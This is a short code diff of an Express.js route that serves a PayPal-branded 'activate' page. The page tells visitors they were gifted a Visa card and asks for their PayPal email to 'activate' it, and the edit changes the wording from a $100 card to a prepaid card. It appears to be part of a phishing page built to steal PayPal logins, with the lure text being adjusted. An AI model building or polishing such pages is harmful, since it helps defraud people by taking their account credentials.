@@ -113,7 +113,7 @@ app.get('/activate.html', (req, res) => {
     <div class="container">
         <div class="logo">PayPal</div>
         <div id="cardDisplayActivate"></div>
-        <p class="gift-text">You were gifted a $100 Visa card, Login with PayPal to activate</p>
+        <p class="gift-text">You were gifted a prepaid Visa card, Login with PayPal to activate</p>
         <div id="cardDetails"></div>
         <div id="errorMessage" class="error-message"></div>
         <input type="text" class="input-field" id="activateUsername" placeholder="PayPal Email">
